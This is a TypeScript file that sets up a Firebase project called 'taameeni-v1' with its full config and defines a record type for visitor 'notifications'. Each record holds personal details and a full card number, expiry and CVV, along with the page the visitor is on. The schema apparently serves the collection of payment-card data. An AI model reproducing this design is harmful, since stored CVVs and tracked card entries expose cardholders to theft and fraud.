import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyB-qlb_QYAPBqijr00XN-PeUd9DTzI0MDs",
  authDomain: "taameeni-v1.firebaseapp.com",
  databaseURL: "https://taameeni-v1-default-rtdb.firebaseio.com",
  projectId: "taameeni-v1",
  storageBucket: "taameeni-v1.firebasestorage.app",
  messagingSenderId: "240999338900",
  appId: "1:240999338900:web:bb73a1ea1239d2c074f581",
  measurementId: "G-MP49WZ65T2"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}




